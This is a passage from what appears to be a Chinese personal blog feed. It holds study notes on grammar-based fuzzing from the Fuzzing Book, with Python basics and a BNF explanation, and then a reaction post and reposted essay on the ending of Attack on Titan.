        <content type="html"><![CDATA[<h1 id="NoteBook阅读"><a href="#NoteBook阅读" class="headerlink" title="NoteBook阅读"></a>NoteBook阅读</h1><h2 id="Probabilistic-Grammar-Fuzzing"><a href="#Probabilistic-Grammar-Fuzzing" class="headerlink" title="Probabilistic Grammar Fuzzing"></a>Probabilistic Grammar Fuzzing</h2><p>我们可以根据我们的需要去生成测试数据, 可以给某个<code>expansion</code>很高的权重, 这样的话, 在生成的数据过程中, 这个<code>expansion</code>被选择的概率就很高. 最终数据中的占比也就比较高.</p><blockquote><p>下面原文的意思也就是上面所说的</p></blockquote><h3 id="Synopsis"><a href="#Synopsis" class="headerlink" title="Synopsis"></a>Synopsis</h3><p>To <a href="Importing.ipynb">use the code provided in this chapter</a>, write</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">from</span> fuzzingbook<span class="token punctuation">.</span>ProbabilisticGrammarFuzzer <span class="token keyword">import</span> <span class="token operator">&lt;</span>identifier<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>and then make use of the following features.</p><p>A <em>probabilistic</em> grammar allows to attach individual <em>probabilities</em> to production rules.  To set the probability of an individual expansion <code>S</code> to the value <code>X</code> (between 0 and 1), replace it with a pair</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">(</span>S<span class="token punctuation">,</span> opts<span class="token punctuation">(</span>prob<span class="token operator">=</span>X<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>If we want to ensure that 90% of phone numbers generated have an area code starting with <code>9</code>, we can write:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">from</span> Grammars <span class="token keyword">import</span> US_PHONE_GRAMMAR<span class="token punctuation">,</span> extend_grammar<span class="token punctuation">,</span> opts<span class="token operator">>></span><span class="token operator">></span> PROBABILISTIC_US_PHONE_GRAMMAR<span class="token punctuation">:</span> Grammar <span class="token operator">=</span> extend_grammar<span class="token punctuation">(</span>US_PHONE_GRAMMAR<span class="token punctuation">,</span><span class="token operator">>></span><span class="token operator">></span> <span class="token punctuation">&#123;</span><span class="token operator">>></span><span class="token operator">></span>       <span class="token string">"&lt;lead-digit>"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token operator">>></span><span class="token operator">></span>                           <span class="token string">"2"</span><span class="token punctuation">,</span> <span class="token string">"3"</span><span class="token punctuation">,</span> <span class="token string">"4"</span><span class="token punctuation">,</span> <span class="token string">"5"</span><span class="token punctuation">,</span> <span class="token string">"6"</span><span class="token punctuation">,</span> <span class="token string">"7"</span><span class="token punctuation">,</span> <span class="token string">"8"</span><span class="token punctuation">,</span><span class="token operator">>></span><span class="token operator">></span>                           <span class="token punctuation">(</span><span class="token string">"9"</span><span class="token punctuation">,</span> opts<span class="token punctuation">(</span>prob<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span>                       <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">>></span><span class="token operator">></span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>A <code>ProbabilisticGrammarFuzzer</code> will extract and interpret these options.  Here is an example:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> probabilistic_us_phone_fuzzer <span class="token operator">=</span> ProbabilisticGrammarFuzzer<span class="token punctuation">(</span>PROBABILISTIC_US_PHONE_GRAMMAR<span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> <span class="token punctuation">[</span>probabilistic_us_phone_fuzzer<span class="token punctuation">.</span>fuzz<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'(918)925-2501'</span><span class="token punctuation">,</span> <span class="token string">'(981)925-0792'</span><span class="token punctuation">,</span> <span class="token string">'(934)995-5029'</span><span class="token punctuation">,</span> <span class="token string">'(955)999-7801'</span><span class="token punctuation">,</span> <span class="token string">'(964)927-0877'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>As you can see, the large majority of area codes now starts with <code>9</code>.</p><h3 id="Learning-Probabilities-from-Samples"><a href="#Learning-Probabilities-from-Samples" class="headerlink" title="Learning Probabilities from Samples"></a>Learning Probabilities from Samples</h3><p>对于<code>expasion</code>的权重来讲, 必须要通过人工设定. 我们可以通过学习样本数据来设定这样的权重.</p><p>Probabilities need not be set manually all the time.  They can also be <em>learned</em> from other sources, notably by counting <em>how frequently individual expansions occur in a given set of inputs</em>.  This is useful in a number of situations, including:</p><ol><li>Test <em>common</em> features.  The idea is that during testing, one may want to focus on frequently occurring (or frequently used) features first, to ensure correct functionality for the most common usages.</li><li>Test <em>uncommon</em> features.  Here, the idea is to have test generation focus on features that are rarely seen (or not seen at all) in inputs.  This is the same motivation as with <a href="GrammarCoverageFuzzer.ipynb">grammar coverage</a>, but from a probabilistic standpoint.</li><li>Focus on specific <em>slices</em>.  One may have a set of inputs that is of particular interest (for instance, because they exercise a critical functionality, or recently have discovered bugs).  Using this learned distribution for fuzzing allows us to <em>focus</em> on precisely these functionalities of interest.</li></ol><h3 id="Lessons-Learned"><a href="#Lessons-Learned" class="headerlink" title="Lessons Learned"></a>Lessons Learned</h3><ul><li>By specifying probabilities, one can steer fuzzing towards input features of interest.</li><li>Learning probabilities from samples allows one to focus on features that are common or uncommon in input samples.</li><li>Learning probabilities from a subset of samples allows one to produce more similar inputs.</li></ul>]]></content>
      
      
      <categories>
          
          <category> 毕设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Fuzz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>毕设-Fuzz-7</title>
      <link href="/2021/12/05/bi-she-fuzz-7/"/>
      <url>/2021/12/05/bi-she-fuzz-7/</url>
      
        <content type="html"><![CDATA[<h1 id="NoteBook阅读"><a href="#NoteBook阅读" class="headerlink" title="NoteBook阅读"></a>NoteBook阅读</h1><h2 id="Grammar-Coverage"><a href="#Grammar-Coverage" class="headerlink" title="Grammar Coverage"></a>Grammar Coverage</h2><p>在之前, 按照语法去去扩展生成字符串的时候, <strong>总是把各种扩展被选择的可能性相等化</strong>. 但是呢, 对于产生详细的综合性测试数据来说, <strong>更看重种类的最大化.(不一次又一次地重复相同的扩展)</strong></p><p>所以, 这小节就是为了解决这个问题. 当然, 在我们上一节的扩展中, 我们使用了<code>maxcost</code>和<code>mincost</code>两种方法, 也确实在一定程度上, 增大了种类的多样性,同时也避免了无限扩展的发生. 可能这一节会对这个问题展开更详细地解答把.</p><blockquote><p>毕竟从理论上来说, 更多地对产生输入数据路径的覆盖(<code>更高的语法覆盖率</code>)理论上会产生更高的<code>代码覆盖率</code>, 也就更有可能触发新的bug. 这也是这部分工作的意义</p></blockquote><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211205200902.png" alt="三种方法的效果对比"></p><h3 id="Synopsis"><a href="#Synopsis" class="headerlink" title="Synopsis"></a>Synopsis</h3><p>This chapter introduces <code>GrammarCoverageFuzzer</code>, an efficient grammar fuzzer extending <code>GrammarFuzzer</code> from the <a href="GrammarFuzzer.ipynb">chapter on efficient grammar fuzzing</a>.  It strives to <em>cover all expansions at least once,</em> thus ensuring coverage of functionality.</p><p>In the following example, for instance, we use <code>GrammarCoverageFuzzer</code> to produce an expression. We see that the resulting expression <strong>covers all digits and all operators in a single expression.</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">>></span> <span class="token string">'-(2 + 3) * 4.5 / 6 - 2.0 / +8 + 7 + 3'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Lessons-Learned"><a href="#Lessons-Learned" class="headerlink" title="Lessons Learned"></a>Lessons Learned</h3><ul><li>Achieving <em>grammar coverage</em> quickly results in a large variety of inputs.</li><li>Duplicating grammar rules allows to cover elements in specific <em>contexts</em>.–这个点,我是真的不太理解, 相当于复制了很多副本进来. 这样就能实现很覆盖语法路径?</li><li>Achieving grammar coverage can help in obtaining <em>code coverage</em>.—这个东西, 要具体问题具体分析, 在有些问题上面, 语法覆盖率和代码覆盖率是正相关. 但并不代表所有的问题都是这样.</li></ul>]]></content>
      
      
      <categories>
          
          <category> 毕设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Fuzz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>毕设-Fuzz-6</title>
      <link href="/2021/12/03/bi-she-fuzz-6/"/>
      <url>/2021/12/03/bi-she-fuzz-6/</url>
      
        <content type="html"><![CDATA[<h1 id="NoteBook阅读"><a href="#NoteBook阅读" class="headerlink" title="NoteBook阅读"></a>NoteBook阅读</h1><h2 id="GrammarFuzzer"><a href="#GrammarFuzzer" class="headerlink" title="GrammarFuzzer"></a>GrammarFuzzer</h2><p>这一小节讲的是, 将字符串的表现形式变成了树结构. 方便查找和更改</p><p>并且呢, 我们优化了之前根据语法生成数据的方法, ***(按照之前的方法生成测试数据,会发现大部分测试数据非常长,并没有很大的意义) *** 因为 <strong>如果不对非终止符的最大和最小值进行限制的话, 会分别导致无限循环和测试数据种类不全的问题</strong>.</p><p>之前算法的问题:</p><p>The problem of potentially infinite expansion is only one of the problems with <code>simple_grammar_fuzzer()</code>.  More problems include:</p><ol><li><p><em>It is inefficient</em>.  With each iteration, this fuzzer would go search the string produced so far for symbols to expand.  This becomes inefficient as the production string grows.— 效率比较低, 因为每次扩展的时候, 要搜素字符串去寻找相应的扩展symbol-(<code>前面算法里面加了很多正则匹配提取字符串的</code>), 字符串一长效率自然就低下来了. 不过, python中存储字符串的结构是什么? 应该是列表, 这样的话 肯定是不如树的遍历来的快一些.-(<code>不是很清楚到底是因为什么原因导致了, 生成测试字符串效率变高, 但无疑从结果的角度上面看的话, 改进之后的遍历方式确实要比之前快多了</code>)</p></li><li><p><em>It is hard to control.</em>  Even while limiting the number of symbols, it is still possible to obtain very long strings – and even infinitely long ones, as discussed above.—很难控制, 容易生成很长的字符串</p></li></ol><p>统一生成50个测试数据的话:</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211204154412.png" alt="改进前-Average time: 0.24"></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211204154543.png" alt="改进后-Average time: 0.06"></p><blockquote><p>就感觉这一小节都在讲如何构建这个树结构, 以及采用何种策略拓展节点.(在设置的最大最小值的范围内)</p></blockquote><p><strong>The key idea in this chapter, namely expanding until a limit of symbols is reached, and then always choosing the shortest path, stems from Luke</strong></p><h3 id="Lessons-Learned"><a href="#Lessons-Learned" class="headerlink" title="Lessons Learned"></a>Lessons Learned</h3><ul><li><em>Derivation trees</em> are important for expressing input structure</li><li><em>Grammar fuzzing based on derivation trees</em> <ol><li>is much more efficient than string-based grammar fuzzing,</li><li>gives much better control over input generation, and</li><li>effectively avoids running into infinite expansions.</li></ol></li></ul><h3 id="BNF语法"><a href="#BNF语法" class="headerlink" title="BNF语法"></a>BNF语法</h3><p>在上一小节中同样也用过BNF还有EBNF(BNF的一种增强型)</p><p>作者：不是Zoe<br>链接：<a href="https://www.zhihu.com/question/27051306/answer/579820547">https://www.zhihu.com/question/27051306/answer/579820547</a><br>来源：知乎<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p><p>BNF是John Backus 在20世纪90年代提出的用以简洁描述一种编程语言的语言。</p><p>基本结构为：<code>&lt;non-terminal&gt; ::= &lt;replacement&gt;</code> non-terminal意为非终止符，就是说我们还没有定义完的东西，还可以继续由右边的replacement，也就是代替物来进一步解释、定义。</p><p>举个例子：在中文语法里，一个句子一般由“主语”、“谓语”和“宾语”组成，主语可以是名词或者代词，谓语一般是动词，宾语可以使形容词，名词或者代词。那么“主语”、“谓语”和“宾语”就是非终止符，因为还可以继续由“名词”、“代词”、“动词”、“形容词”等替代。</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">例1. &lt;句子> ::= &lt;主语>&lt;谓语>&lt;宾语>例2. &lt;主语> ::= &lt;名词>|&lt;代词>例3. &lt;谓语>::=&lt;动词>例4. &lt;宾语>::=&lt;形容词>|&lt;名词>|&lt;代词>例5. &lt;代词>::=&lt;我>例6. &lt;动词>::=&lt;吃>例7. &lt;动词>::=&lt;喜欢>例8. &lt;名词>::=&lt;车>例9. &lt;名词>::=&lt;肉><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如上，在<code>::=</code>左边的就是<code>non-terminal</code>非终止符，右边的就是<code>replacement</code>，可以是一系列的非终止符，如例1中的<code>replacement</code>便是后面例234左边的非终止符，也可以是终止符，如例56789的右边，找不到别的符号来进一步代替。因此，终止符永远不会出现在左边。一旦我们看到了终止符，这个描述过程就结束了。</p><h3 id="py高阶用法"><a href="#py高阶用法" class="headerlink" title="py高阶用法"></a>py高阶用法</h3><h4 id="可变参数-amp-amp-关键字参数"><a href="#可变参数-amp-amp-关键字参数" class="headerlink" title="可变参数&amp;&amp;关键字参数"></a>可变参数&amp;&amp;关键字参数</h4><p><strong>可变参数允许你传入0个或任意个参数，这些可变参数在函数调用时自动组装为一个tuple</strong>,而<strong>关键字参数允许你传入0个或任意个含参数名的参数，这些关键字参数在函数内部自动组装为一个dict。</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token operator">*</span>a<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>test<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">test1</span><span class="token punctuation">(</span><span class="token operator">**</span>a<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>test1<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">"test"</span><span class="token punctuation">,</span>name1<span class="token operator">=</span><span class="token string">"test1"</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> <span class="token punctuation">&#123;</span><span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'test'</span><span class="token punctuation">,</span> <span class="token string">'name1'</span><span class="token punctuation">:</span> <span class="token string">'test1'</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>除了函数的传参, 在赋值的语句中也会出现可选参数</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"a b c"</span><span class="token punctuation">,</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">)</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">,</span><span class="token operator">*</span>d <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"a b c d"</span><span class="token punctuation">,</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">,</span>d<span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> a b c <span class="token number">1</span> <span class="token number">2</span> <span class="token number">3</span><span class="token operator">>></span><span class="token operator">></span> a b c d <span class="token number">1</span> <span class="token number">2</span> <span class="token number">3</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="repr-函数"><a href="#repr-函数" class="headerlink" title="repr() 函数"></a>repr() 函数</h4><p>repr() 函数将对象转化为供解释器读取的形式。<br><strong>参数</strong><br>object – 对象。<br><strong>返回值</strong><br>返回一个对象的 string 格式。</p><blockquote><p>这个函数有一说一, 还是不理解到底用处是啥. 有的时候传参不加repr(a)会说a缺少某个属性, 但是repr(a)按照上面的理解的话, 也只是变成了一个字符串. 那为什么就莫名其妙不缺少这个属性了.~~</p></blockquote><h4 id="递归加循环的写法"><a href="#递归加循环的写法" class="headerlink" title="递归加循环的写法"></a>递归加循环的写法</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">all_terminals</span><span class="token punctuation">(</span>tree<span class="token punctuation">:</span> DerivationTree<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    <span class="token punctuation">(</span>symbol<span class="token punctuation">,</span> children<span class="token punctuation">)</span> <span class="token operator">=</span> tree    <span class="token keyword">if</span> children <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token comment"># This is a nonterminal symbol not expanded yet</span>        <span class="token keyword">return</span> symbol    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>children<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token comment"># This is a terminal symbol</span>        <span class="token keyword">return</span> symbol    <span class="token comment"># This is an expanded symbol:</span>    <span class="token comment"># Concatenate all terminal symbols from all children</span>    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>all_terminals<span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> children<span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="any-函数"><a href="#any-函数" class="headerlink" title="any()函数"></a>any()函数</h4><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211203211320.png" alt="any函数"></p><h4 id="集合set"><a href="#集合set" class="headerlink" title="集合set()"></a>集合set()</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">a<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">&#125;</span>b<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">&#125;</span>c<span class="token operator">=</span> a<span class="token operator">|</span>b <span class="token comment"># 把a b集合拼接在一起,不重复的那种</span><span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="print"><a href="#print" class="headerlink" title="print()"></a>print()</h4><blockquote><p>我这是来学习fuzz的? 还是在重新学习python的详细编程?</p></blockquote><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211204152407.png" alt="print()"></p>]]></content>
      
      
      <categories>
          
          <category> 毕设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Fuzz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动漫-进击的巨人</title>
      <link href="/2021/12/01/dong-man-jin-ji-de-ju-ren/"/>
      <url>/2021/12/01/dong-man-jin-ji-de-ju-ren/</url>
      
        <content type="html"><![CDATA[<p>本篇是在网上找到的, 自认为相对评价客观而且质量较高的. 原封不动的复制下来的. 即使是看了这篇文章, 仍然还是有很多问题我没有理解. </p><p>作者 杨宸<br><a href="https://www.artforum.com.cn/slant/13455">https://www.artforum.com.cn/slant/13455</a></p><p>一直以来, 我都认为只有文学作品才能达到这种高度. 现在才发现动漫也是文学作品. </p><ul><li><p><input checked="" disabled="" type="checkbox">  什么是决断主义? 什么是心理主义?</p><p>A: 这些应该也是日本动漫作品类型的分类, 也没查到很具体的定义.</p></li><li><p><input checked="" disabled="" type="checkbox">  斯德哥尔摩综合症在现实生活中体现的例子?</p><p>A: 这个感觉一句话概况的很好, <strong>人是可以被驯服的</strong> 人性能承受的恐惧是一条脆弱的底线，人在恐惧、饥饿面前一点点的被奴化，并非不想反抗，只是在特定环境下，失去了反抗的能力以及思维。</p></li><li><p><input checked="" disabled="" type="checkbox">  什么是世界系? 什么是幸存系?</p><p>A: 这两个是动漫作品的分类.<strong>“世界系”</strong> 所描述的作品群的特征是，“以故事主人公（我）和他所牵挂的女主角（你）的二人关系为中心，将小的日常性（你和我）的问题与‘世界的危机’、‘这个世界的终结’等抽象且非日常的大问题直接连接起来，舍弃一切中间具体的（社会性的）说明描写。”<br><strong>“幸存系”</strong> 以在特定战斗空间内发生的“生死斗争”为基本模式，“不战斗就会死”的幸存感弥漫其中，《死亡笔记》（2003-2006）、《反叛的鲁路修》（2006）便是其中的典型。</p></li></ul><p>其实, 我之前理解这部作品想传递的价值观非常简单. 是人类在面对未知世界不断探索的精神, 是在面对危险和内心极大恐惧时咬牙前行的勇气, 是在战争双方残酷战场上闪耀的微茫的人性的光辉, 是为了守护心爱的人奋不顾身的爱情, 是为了保全同胞不惜牺牲自己的友情. 结果, 作者却在第四季,一个接一个的打破了我之前想象好的所有的价值观. </p><ul><li>人类并没有灭绝. 反倒是壁内的各位被洗脑之后, 赶到了一个岛上自己封闭. 因为之前残暴的历史, 至今被人们甚至是自己的同胞视为恶魔.被无情的当作工具.</li><li>三笠和艾伦好像是个悲剧. 艾伦居然在说, 三笠是简单的把自己视为要守护的主人. 这一点真的是我最不能接受的. 那个曾经为了家人和朋友战斗的高大形象, 瞬间崩塌. 最后还让三笠等自己个十年?, 撒小孩子脾气. 真是~~. 无数次的保护, 换来的难道只是自己心爱的人说自己只是个奴隶? 如果预料到这, 艾伦还不如早点死了.</li><li>曾经调查军团各位战友的慷慨赴死到底是为了什么? 他们自认为是为了人类的生存事业而死, 但到最后换来是发动地鸣毁灭世界. 那么多人的牺牲, 在我看来,毫无意义.先是被始祖巨人洗脑, 再后来是被艾伦戏耍. 这难道就是棋子吗?</li><li>还有就像是傻子一样的艾伦, 最开始是因为自己妈妈被巨人吃掉, 到后来是因为他自己控制巨人把自己妈妈吃掉. 我真醉了………</li></ul><h1 id="进击的巨人"><a href="#进击的巨人" class="headerlink" title="进击的巨人"></a>进击的巨人</h1><p>致2000年后的你<br>2021.07.17 • 杨宸论《进击的巨人》结局为何失败</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211201110133.png" alt="《进击的巨人》TV版最终季剧照，2021"></p><p>漫画《进击的巨人》于4月9日完结后，关于大结局的讨伐之声便不绝于耳。神剧烂尾、结局崩坏是大部分读者给出的评价。诚然如此，不过，在大结局造成的创伤后应激反应平复之后，更值得追问的问题也许是，《巨人》的结局为何“失败”？或者说，在何种意义上，《巨人》的结局“失败”了？本文希望回到《巨人》的整体创作以及它侧身其中之特定的历史与现实，以穿透这一“失败”之本质，这也是今天我们还要谈论这部漫画的意义所在。</p><p>2009年，23岁的年轻人谏山创（Isayama Hajime）开始连载他的出道作《进击的巨人》，四年之后，《巨人》迎来了动画化，并迅速成为当季霸主，人气一路飞飙。到2020年，《巨人》漫画已经售出超9000万册。对于《巨人》的成功，Wit Studio动画公司的精良制作和泽野弘之（Sawano Hiroyuki）那磅礴悲壮的配乐功不可没，但更重要的是，谏山创为《巨人》打造的“世界”及萦绕其上的“谜团”。</p><p>一言蔽之，《进击的巨人》讲述了如同家畜般被“豢养”在三堵巨大高墙之内的人类与墙外不断捕食人类的巨人相抗争的故事。在“那一天”，因玛丽亚之墙被铠甲巨人和超大型巨人攻破，主角艾伦·耶格尔眼睁睁看着自己的母亲被巨人吞噬。人类家园沦丧，悲愤的艾伦发誓“要把它们全部驱逐出去，一匹不留”，而后他与青梅竹马的三笠、好友阿明加入了以探索墙外世界、与巨人斗争为己任的调查兵团。整个故事便围绕着艾伦及其所属的调查兵团展开。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211201110308.png" alt="《进击的巨人》TV版第一季剧照，2013"></p><p>乍一看，《巨人》几乎集齐了既往少年漫画必备的所有要素：庞大的世界观、中二感爆棚的主角、精彩绝伦的战斗场面（得益于“立体机动装置”带来的滑翔战斗模式）、伙伴间的羁绊……而且随着剧情展开，观众发现主角的身世没那么简单——“天选之子”，这更是少年漫主角的“标配”。然而，使《巨人》与此前《火影忍者》、《死神》、《海贼王》等主流少年漫区别开来的，却是其剧情的“残酷”。</p><p>和同时期引发热潮的《权力的游戏》类似，在《巨人》中，人命如草芥，死亡可以随时降临到任何人头上，而且是以极其残酷的方式。你认为可能是重要人物的角色，或许下一秒就被巨人掰断了脊骨，一口口嚼碎。《巨人》非常着力于刻画人类面对巨人时的恐惧，并以死前狰狞扭曲的表情来展现这种残酷之直观。即便是带领调查兵团取得诸多战果的大英雄埃尔文团长，在主动迎向猿巨人而英勇赴死的那一刻，脸上仍然非常明显地流露出了对于死亡的惧怖。《巨人》的生存哲学正是建立在这种死亡的直观之上：“<strong>那些勇敢的死者、那些可悲的死者，我们之所以能这么想，正是因为我们是生者。我们会死在这里，将意义托付给下一个生者，这就是与这个残酷世界抗争的唯一手段！</strong>”</p><p>在这个意义上，《巨人》可以被归入日本评论家宇野常宽（Uno Tsunehiro）所称的“幸存系”作品序列之中。宇野常宽认为，在2001年前后，日本出现了一种新的故事类型，这类故事以在特定战斗空间内发生的“生死斗争”为基本模式，“不战斗就会死”的幸存感弥漫其中，《死亡笔记》（2003-2006）、《反叛的鲁路修》（2006）便是其中的典型。因为1999年高见广春（Takami Koshun）的小说《大逃杀》可以被视为其先驱，所以这类故事又被称为“大逃杀系”。幸存系/大逃杀系的兴起在日本国内有着明确的现实动因：为了应对泡沫经济破灭后的“平成不况”，日本首相小泉纯一郎在21世纪初开始进行新自由主义的结构性改革。小泉改革的风格颇类当年的撒切尔夫人，力倡小政府，推行私有化。其中最著名的事件，便是小泉不惜冒巨大政治风险解散众议院也要将日本的邮政系统民营化。如此一来，国民生活被一股脑推给市场，虽然经济逐步复苏，但贫富差距也随之越拉越大。置身于这般弱肉强食的残酷市场竞争机制之中，年轻人可以无忧躺在床上看动漫打游戏当个家里蹲御宅族的日子一去不返，“不战斗/奋斗就会死”成为了年轻人的紧箍咒。用我们熟悉的话来说，2001年之后的日本年轻人，已经不再能够悠闲地躺平，只得参与到疯狂的内卷之中。</p><p>日本的情况其实内在于晚期资本主义的全球化进程之中。这也是为什么作为全球化进程副产品的9·11恐怖袭击可以被宇野常宽指认为“大逃杀”的现实开端。于是，正如麦克弗森（C. B. Macpherson）曾提示我们说，霍布斯提出“一切人对一切人的战争”的自然状态不过是对资本主义早期市场的隐喻那样，作为晚期资本主义文化逻辑的外显，一切人对一切人的“大逃杀”兴起了。</p><p>《巨人》无疑是这一思路的延续，然而，它还提供了更为激动人心的东西——它许诺了一个“外部”，一个“墙外的世界”，作为退离大逃杀状态的出口。而对这个出口的探索则与对“世界之谜”的解答相绑定：“为什么那天妈妈会被巨人吃掉”？巨人到底从何而来？墙外的世界是什么样子？……《巨人》最核心的价值——“进击”的“自由”——便是基于对这个既作为解释又作为解决的“墙外世界”之信念，所有的幸福和崇高，皆来源于此：那是得以理解我们为何不得不大逃杀的自由，那是可以免于大逃杀之恐怖残酷的自由，那是不必经历大逃杀也能昂首挺胸堂堂正正地“生活”下去的自由。</p><p>怀揣着这样的自由之信念，《巨人》在漫画第91话/动画最终季迎来了其最大的转折。</p><p>“海那边有自由。”</p><p>“不，海那边有敌人。”</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211201110345.png" 